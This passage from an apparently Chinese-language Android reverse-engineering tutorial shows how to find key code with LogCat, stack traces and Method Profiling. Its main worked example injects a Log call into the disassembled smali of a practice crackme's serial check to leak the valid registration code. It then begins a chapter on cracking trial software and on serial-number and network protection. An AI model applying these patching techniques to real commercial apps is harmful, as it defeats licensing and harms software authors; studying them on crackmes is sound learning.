Profiling是使用最多的功能。文件浏览可以查看需要分析的程序在安装目录下生成的文件，分析这些文件的内容可以对程序的设置及生成的数据有初步的了解；LogCat则可以输出软件运行时的调试信息；Method Profilng用于跟踪程序的执行流程。</p><p>在Android SDK的tools目录下有一个<code>ddms.bat</code>，它就是DDMS的启动文件。</p><h2 id="7-1-使用LogCat查看调试信息"><a href="#7-1-使用LogCat查看调试信息" class="headerlink" title="7.1 使用LogCat查看调试信息"></a>7.1 使用LogCat查看调试信息</h2><p>Android SDK提供了android.util.Log类来输出调试信息。该类提供了<code>Log.v()</code>、<code>Log.d()</code>、<code>Log.i()</code>、<code>Log.w()</code>以及<code>Log.e()</code>等5个调试信息输出方法。</p><ul><li>v表示输出VERBOSE类型的信息</li><li>d表示输出DEBUG类型的信息</li><li>i表示输出INFO类型的信息</li><li>w表示输出WARN类型的信息</li><li>e表示输出ERROR类型的信息</li></ul><p>启动Android设备，就可在DDMS中查看该设备所有运行中的进程。</p><img src="/posts/d368aa06/7.1.1.jpg" class="" title="DDMS查看Android设备进程"><p>去AS中查看LogCat信息会更加详细。</p><h2 id="7-2-定位关键代码"><a href="#7-2-定位关键代码" class="headerlink" title="7.2 定位关键代码"></a>7.2 定位关键代码</h2><h3 id="7-2-1-代码注入法"><a href="#7-2-1-代码注入法" class="headerlink" title="7.2.1 代码注入法"></a>7.2.1 代码注入法</h3><p>通常一个程序在发布时不会保留Log输出信息，要想在程序的特定位置输出信息还需手动进行代码注入，所谓代码注入是指首先反编译Android程序，然后在反汇编出的Smali文件中添加Log调用的代码，最后重新打包程序运行来查看输出结果。</p><p>同样分析<code>app-debug.apk</code>中的Smali代码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">.method private checkSN(Ljava/lang/String;Ljava/lang/String;)Z</span><br><span class="line">    .locals 11</span><br><span class="line">    .param p1, &quot;username&quot;    # Ljava/lang/String;</span><br><span class="line">    .param p2, &quot;sn&quot;    # Ljava/lang/String;</span><br><span class="line">    .annotation system Ldalvik/annotation/MethodParameters;</span><br><span class="line">        accessFlags = &#123;</span><br><span class="line">            0x0,</span><br><span class="line">            0x0</span><br><span class="line">        &#125;</span><br><span class="line">        names = &#123;</span><br><span class="line">            &quot;username&quot;,</span><br><span class="line">            &quot;sn&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    .end annotation</span><br><span class="line"></span><br><span class="line">    .line 39</span><br><span class="line">    const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">    if-eqz p1, :cond_7#检查username是否为空</span><br><span class="line"></span><br><span class="line">    :try_start_0</span><br><span class="line">    invoke-virtual &#123;p1&#125;, Ljava/lang/String;-&gt;length()I#获取username长度</span><br><span class="line"></span><br><span class="line">    move-result v1</span><br><span class="line"></span><br><span class="line">    if-nez v1, :cond_0#检查username长度是否为0</span><br><span class="line"></span><br><span class="line">    goto/16 :goto_3</span><br><span class="line"></span><br><span class="line">    .line 41</span><br><span class="line">    :cond_0</span><br><span class="line">    if-eqz p2, :cond_6#检查sn是否为空</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p2&#125;, Ljava/lang/String;-&gt;length()I#获取sn长度</span><br><span class="line"></span><br><span class="line">    move-result v1</span><br><span class="line"></span><br><span class="line">    const/16 v2, 0x10#v2=16</span><br><span class="line"></span><br><span class="line">    if-eq v1, v2, :cond_1#判断sn长度是否为16</span><br><span class="line"></span><br><span class="line">    goto :goto_2</span><br><span class="line"></span><br><span class="line">    .line 43</span><br><span class="line">    :cond_1</span><br><span class="line">    const-string v1, &quot;MD5&quot;</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v1&#125;, Ljava/security/MessageDigest;-&gt;getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    .line 44</span><br><span class="line">    .local v1, &quot;digest&quot;:Ljava/security/MessageDigest;</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/MessageDigest;-&gt;reset()V</span><br><span class="line"></span><br><span class="line">    .line 45</span><br><span class="line">    invoke-virtual &#123;p1&#125;, Ljava/lang/String;-&gt;getBytes()[B#将username转换为字节数组</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1, v2&#125;, Ljava/security/MessageDigest;-&gt;update([B)V</span><br><span class="line"></span><br><span class="line">    .line 46</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/MessageDigest;-&gt;digest()[B#username进行MD5摘要运算</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    .line 47</span><br><span class="line">    .local v2, &quot;bytes&quot;:[B</span><br><span class="line">    new-instance v3, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v3&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 48</span><br><span class="line">    .local v3, &quot;sb1&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    new-instance v4, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v4&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 49</span><br><span class="line">    .local v4, &quot;sb2&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    array-length v5, v2#v5取username进行MD5摘要结果的长度</span><br><span class="line"></span><br><span class="line">    const/4 v6, 0x0#v6=0</span><br><span class="line"></span><br><span class="line">    :goto_0</span><br><span class="line">    const/4 v7, 0x1#v7=1</span><br><span class="line"></span><br><span class="line">    if-ge v6, v5, :cond_3</span><br><span class="line"></span><br><span class="line">    aget-byte v8, v2, v6#从v2中取下标为6的字节存入v8</span><br><span class="line"></span><br><span class="line">    .line 51</span><br><span class="line">    .local v8, &quot;b&quot;:B</span><br><span class="line">    and-int/lit16 v9, v8, 0xff#v8与0xff相与存入v9</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v9&#125;, Ljava/lang/Integer;-&gt;toHexString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v9</span><br><span class="line"></span><br><span class="line">    .line 52</span><br><span class="line">    .local v9, &quot;hexstr&quot;:Ljava/lang/String;</span><br><span class="line">    invoke-virtual &#123;v9&#125;, Ljava/lang/String;-&gt;length()I#获取v9的长度存到v10</span><br><span class="line"></span><br><span class="line">    move-result v10</span><br><span class="line"></span><br><span class="line">    if-ne v10, v7, :cond_2#如果长度为1，继续往下执行</span><br><span class="line"></span><br><span class="line">    .line 54</span><br><span class="line">    new-instance v7, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v7&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    const-string v10, &quot;0&quot;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v7, v10&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v7, v9&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v7&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v7</span><br><span class="line"></span><br><span class="line">    move-object v9, v7</span><br><span class="line"></span><br><span class="line">    .line 56</span><br><span class="line">    :cond_2</span><br><span class="line">    invoke-virtual &#123;v3, v9&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;#将v9的结果加入到v3</span><br><span class="line"></span><br><span class="line">    .line 49</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">    .end local v8    # &quot;b&quot;:B</span><br><span class="line">    .end local v9    # &quot;hexstr&quot;:Ljava/lang/String;</span><br><span class="line">    add-int/lit8 v6, v6, 0x1</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line 58</span><br><span class="line">    :cond_3</span><br><span class="line">    const/4 v5, 0x0#v5=0</span><br><span class="line"></span><br><span class="line">    .local v5, &quot;i&quot;:I</span><br><span class="line">    :goto_1</span><br><span class="line">    invoke-virtual &#123;v3&#125;, Ljava/lang/StringBuilder;-&gt;length()I#获取v3的长度到v6</span><br><span class="line"></span><br><span class="line">    move-result v6</span><br><span class="line"></span><br><span class="line">    if-ge v5, v6, :cond_4</span><br><span class="line"></span><br><span class="line">    .line 59</span><br><span class="line">    invoke-virtual &#123;v3, v5&#125;, Ljava/lang/StringBuilder;-&gt;charAt(I)C#取v3下标为v5的字符到v6</span><br><span class="line"></span><br><span class="line">    move-result v6</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v4, v6&#125;, Ljava/lang/StringBuilder;-&gt;append(C)Ljava/lang/StringBuilder;#将v6加入到v4</span><br><span class="line"></span><br><span class="line">    .line 58</span><br><span class="line">    add-int/lit8 v5, v5, 0x2#v5自增2</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    .line 60</span><br><span class="line">    .end local v5    # &quot;i&quot;:I</span><br><span class="line">    :cond_4</span><br><span class="line">    invoke-virtual &#123;v4&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v5#获取v4内容到v5</span><br><span class="line"></span><br><span class="line">    .line 61</span><br><span class="line">    .local v5, &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line">    invoke-virtual &#123;v5, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z#判断v5与sn的内容是否相等，返回值存到v6</span><br><span class="line"></span><br><span class="line">    move-result v6</span><br><span class="line">    :try_end_0</span><br><span class="line">    .catch Ljava/security/NoSuchAlgorithmException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0</span><br><span class="line"></span><br><span class="line">    if-nez v6, :cond_5</span><br><span class="line"></span><br><span class="line">    .line 62</span><br><span class="line">    return v0</span><br><span class="line"></span><br><span class="line">    .line 68</span><br><span class="line">    .end local v1    # &quot;digest&quot;:Ljava/security/MessageDigest;</span><br><span class="line">    .end local v2    # &quot;bytes&quot;:[B</span><br><span class="line">    .end local v3    # &quot;sb1&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    .end local v4    # &quot;sb2&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    .end local v5    # &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line">    :cond_5</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">    .line 69</span><br><span class="line">    return v7</span><br><span class="line"></span><br><span class="line">    .line 42</span><br><span class="line">    :cond_6</span><br><span class="line">    :goto_2</span><br><span class="line">    return v0</span><br><span class="line"></span><br><span class="line">    .line 64</span><br><span class="line">    :catch_0</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    .line 66</span><br><span class="line">    .local v1, &quot;e&quot;:Ljava/security/NoSuchAlgorithmException;</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">    .line 67</span><br><span class="line">    return v0</span><br><span class="line"></span><br><span class="line">    .line 40</span><br><span class="line">    .end local v1    # &quot;e&quot;:Ljava/security/NoSuchAlgorithmException;</span><br><span class="line">    :cond_7</span><br><span class="line">    :goto_3</span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p><code>.line 61</code>是关键，如果前面分析不出来，那我们用LogCat将v5打印出来，不就知道v5的值是多少了吗？我们尽量不用它设置区间范围的寄存器，所以将该方法的寄存器加1，<code>.locals 11</code>修改为<code>.locals 12</code>，原本程序只需要用v0~v10，那我们用v11就好。在<code>.line 61</code>里注入<code>Log.v()</code>输出v5的值，插入下面两条代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v11, &quot;realSN&quot;</span><br><span class="line">invoke-static &#123;v11, v5&#125;, Landroid/util/Log;-&gt;v(Ljava/lang/String;Ljava/lang/Sting;)I</span><br></pre></td></tr></table></figure><p>在<code>.line 61</code>处的代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.line 61</span><br><span class="line">.local v5, &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line">const-string v11, &quot;realSN&quot;</span><br><span class="line">invoke-static &#123;v11, v5&#125;, Landroid/util/Log;-&gt;v(Ljava/lang/String;Ljava/lang/Sting;)I</span><br><span class="line">invoke-virtual &#123;v5, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v6</span><br></pre></td></tr></table></figure><p>到达<code>.line 61</code>处需要输入16位注册码，点击注册。发现闪退。回到LogCat查看信息，发现它说在android.util.Log包中没找到v()方法。怎么可能呢？我觉得可能是编写这个程序时没有导入android.util.Log包，导致利用不了该包中的方法。</p><img src="/posts/d368aa06/7.2.1.jpg" class="" title="错误"><p>如果用的是AK，可以直接在需要添加Log代码处右键 -&gt; 插入代码 -&gt; Log，会在需要添加代码的地方插入如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;you message&quot;</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v0&#125;, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>此时将插入的代码修改一下，寄存器的值改为v5即可，部分<code>.line 61</code>的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.line 61</span><br><span class="line">.local v5, &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v5&#125;, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v5, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v6</span><br></pre></td></tr></table></figure><p>再次运行，输入16位注册码，点击注册。此时LogCat信息中显示正确的注册码。</p><img src="/posts/d368aa06/7.2.3.jpg" class="" title="正确注册码"><p>可以在程序中验证该注册码是否正确。</p><img src="/posts/d368aa06/7.2.2.jpg" class="" title="注册成功"><h3 id="7-2-2-栈跟踪法"><a href="#7-2-2-栈跟踪法" class="headerlink" title="7.2.2 栈跟踪法"></a>7.2.2 栈跟踪法</h3><p>栈跟踪法同样属于代码注入的范畴。它主要是手动向反汇编后的Smali文件中加入栈跟踪信息输出的代码。与注入Log输出的代码不同的是，栈跟踪法只需知道大概的代码注入点。而且注入代码后的反馈信息比Log注入要详细得多。比如在<code>app-debug.apk</code>中，输入错误注册码会弹出Toast()，我们想知道这个Toast()是何时被调用的。</p><p>采用5.2所讲的特征函数法，在反汇编代码中查找Toast，发现有2个Toast.show()方法。而且它们的上面是字符串的id值。通过查找发现0x7f0e006c是注册失败，0x7f0e006a是注册成功。</p><img src="/posts/d368aa06/7.2.4.jpg" class="" title="特征函数法查找"><p>因为我们是去到了注册失败的那条路，所以在注册失败即<code>.line 26</code>中，Toast.show()方法后添加输出栈跟踪信息的代码即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new-instance v0, Ljava/lang/Exception;</span><br><span class="line">const-string v1, &quot;print trace&quot;</span><br><span class="line">invoke-direct &#123;v0, v1&#125;, Ljava/lang/Exception;-&gt;&lt;init&gt;(Ljava/lang/String;)V</span><br><span class="line">invoke-virtual &#123;v0&#125;, Ljava/lang/Exception;-&gt;printStackTrace()V</span><br></pre></td></tr></table></figure><p>在LogCat中输出警告信息：</p><img src="/posts/d368aa06/7.2.5.jpg" class="" title="特征函数法查找"><p>栈跟踪信息记录了程序从启动到<code>printStackTrace()</code>被执行期间所有被调用过的方法。从下往上查看栈跟踪信息，找到第一条以<code>com.example.crackme</code>开头的信息，发现最开始调用的是<code>OnClick()</code>方法，然后是<code>OnCreate()</code>方法。如此一来，函数的执行流程就一清二楚了。</p><h3 id="7-2-3-Method-Profiling"><a href="#7-2-3-Method-Profiling" class="headerlink" title="7.2.3 Method Profiling"></a>7.2.3 Method Profiling</h3><p>Method Profiling相当于OD的trace功能，它的作用是在执行程序时记录下每个被调用的API名称。</p><p>在DDMS中选中需要关注的程序，点击工具栏中的<code>Start Method Profiling</code>，在程序中执行想要分析的操作，操作完后点击<code>Stop Method Profiling</code>，等待片刻就会弹出TraceView窗口。</p><img src="/posts/d368aa06/7.2.6.png" class="" title="TraceView窗口"><p>任意一个调用方法都有Parents和Children子项，其中Parents表示该方法被哪个方法调用，Children表示该方法调用了哪些方法。</p><p>如果我们想要Method Profiling的代码一开始就执行了，要想对它使用Method Profiling就需要查找开始点与结束点，然后手动注入代码。在android.os.Debug类中，提供了<code>startMethodTracing()</code>与<code>stopMethodTracing()</code>两个方法来开启与关闭Method Profiling。</p><p>Java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android.os.Debug.startMethodTracing(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">a();</span><br><span class="line">android.os.Debug.stopMethodTracing();</span><br></pre></td></tr></table></figure><p>字符串“123”为trace文件名，上面的代码在执行后会在SD卡的根目录中生成<code>123.trace</code>文件，这个文件包含了a()方法执行过程中所有的方法调用与CPU占用时间等信息。生成的文件可以将它pull出来，用Android SDK中tools目录下的traceview打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceview 123.trace</span><br></pre></td></tr></table></figure><p>另外，注入的代码在运行时需要往SD卡中写入文件，因此还需要在反编译的<code>AndroidManifest.xml</code>文件中添加SD卡写入权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission adnroid:name=&quot;android.permission.WRITE_EXTERNAL_STORACE&quot; /&gt;</span><br></pre></td></tr></table></figure><p>如果确定不了开始点与结束点，可以在Activity的<code>OnCreate()</code>方法中注入<code>startMethodTracing()</code>代码，反汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;123&quot;</span><br><span class="line">invoke-static &#123;v0&#125;, Landroid/os/Debug;-&gt;startMethodTracing(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>在<code>OnStop()</code>方法中注入<code>stopMethodTracing()</code>代码，反汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;stopMethodTracing()V</span><br></pre></td></tr></table></figure><p>这样当程序打开并关闭后就会生成<code>123.trace</code>文件，然后使用traceview工具分析即可。</p><h2 id="7-3-使用IDA-Pro动态调试so文件"><a href="#7-3-使用IDA-Pro动态调试so文件" class="headerlink" title="7.3 使用IDA Pro动态调试so文件"></a>7.3 使用IDA Pro动态调试so文件</h2><p>详情请看我的另一篇文章：<a href="https://v5le0n9.github.io/posts/15be101a.html#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81">Android逆向入门教程 9.IDA动态破解登录验证</a></p><h1 id="8-Android软件的破解技术"><a href="#8-Android软件的破解技术" class="headerlink" title="8. Android软件的破解技术"></a>8. Android软件的破解技术</h1><h2 id="8-1-试用版软件"><a href="#8-1-试用版软件" class="headerlink" title="8.1 试用版软件"></a>8.1 试用版软件</h2><p>免费试用版软件是Android平台上比较常见的一种商业软件，这种软件的自我保护能力一般较弱，通常可以手动破解。</p><h3 id="8-1-1-试用版软件的种类"><a href="#8-1-1-试用版软件的种类" class="headerlink" title="8.1.1 试用版软件的种类"></a>8.1.1 试用版软件的种类</h3><p>Android平台的试用版软件大致分为三类：免费试用版、演示版与限制功能版免费版。</p><p>免费试用版的软件通常有一个免费试用期限或次数限制，当达到了期限或免费次数后，软件会提示过期，提醒用户购买软件。</p><p>演示版软件一般只提供软件的部分功能供用户使用，此类软件通常是“免费”的，用户要想使用软件的全部功能则需要向软件作者购买正式版的软件，作者会提供完整版的安装包及使用权限。</p><p>限制功能免费版的软件通常将软件根据功能分成几个级别，例如免费版、高级版、专业版等。免费版只提供最基础的功能，而专业版或高级版则提供更多或全部功能，根据作者的授权风格不同，这三种级别的软件可能使用同一个软件安装包，通过不同的授权来区别使用权限，或使用不同的安装包提供不同的软件功能。</p><h3 id="8-1-2-实例破解——针对授权KEY方式的破解"><a href="#8-1-2-实例破解——针对授权KEY方式的破解" class="headerlink" title="8.1.2 实例破解——针对授权KEY方式的破解"></a>8.1.2 实例破解——针对授权KEY方式的破解</h3><p>破解试用版软件的前提是试用软件中提供了软件的完整功能（即有些功能显示灰色，需要购买才能使用），否则即使解除了软件的授权限制也无法使用完整的功能，失去了破解的意义。</p><p>在使用授权KEY方式分辨授权类型时，可能会用到<code>createPackageContext()</code>方法，它可以创建其它程序的Context，通过这个Context可以访问其它软件包的资源，甚至可以执行其它软件包的代码。但这个方法可能抛出java.lang.SecurityException异常，这个异常为安全异常，通常一个软件是不能够创建其它程序Context的，除非它们拥有相同的用户ID与签名。用户ID是一个字符串标识，在程序<code>AndroidManifest.xml</code>文件的manifest标签中指定，格式为android:sharedUserId=”xxx.xxx.xxx”，当两个程序中指定了相同的用户ID时，这两个程序将运行在同一个进程空间，它们之间的资源此时可以相互访问，如果它们的签名也相同的话，还可以相互执行软件包之间的代码。</p><h2 id="8-2-序列号保护"><a href="#8-2-序列号保护" class="headerlink" title="8.2 序列号保护"></a>8.2 序列号保护</h2><p>序列号保护又称为注册码保护。通常在购买这种保护方式的软件是，用户需要向软件作者提供注册信息(用户名或机器码)，软件作者通过自己编写的“算号”程序计算出注册码发回给用户，用户使用这个注册码完成整个注册过程。“算号”软件也称为注册机，在计算可逆加密算法程序的注册码时，它通常是软件加密算法的一个逆过程。</p><p>序列号保护建议：</p><ul><li><p>序列号加入机器码验证，做到一机一码。</p></li><li><p>使用NDK编写注册模块。将软件注册版提供的功能进行加密，例如对相关代码或数据使用AES、DES等加密算法进行加密，软件在运行时检测注册信息，如果是注册版用户则根据注册信息生成正确的解密密钥，最后使用这个密钥对注册版功能进行解密。</p><p>根据注册信息生成密钥的一种思路可以是：在判断用户注册码正确的情况下，取注册码的前8位对其每个字节进行异或运算，然后使用这8位异或后的字节作为加密密钥，对注册功能代码的解密密钥进行AES/DES加密运算(AES/DEX的加密密钥即为解密密钥)，将生成的加密数据写入程序的配置文件(SharedProferences或File都可以)，软件在运行时读取该数据对代码进行解密，解密成功即说明是注册版用户。</p></li><li><p>加入其它类型的保护方式，多种保护方式结合。</p></li></ul><h2 id="8-3-网络验证"><a href="#8-3-网络验证" class="headerlink" title="8.3 网络验证"></a>8.3 网络验证</h2><p>网络验证是指软件在运行时需要联网进行一些验证。网络连接方式可以是Socket连接与HTTP连接，验证的内容可以是软件注册信息验证、代码完整性验证以及软件功能解密等。</p><h3 id="8-3-1-网络验证保护思路"><a href="#8-3-1-网络验证保护思路" class="headerlink" title="8.3.1 网络验证保护思路"></a>8.3.1 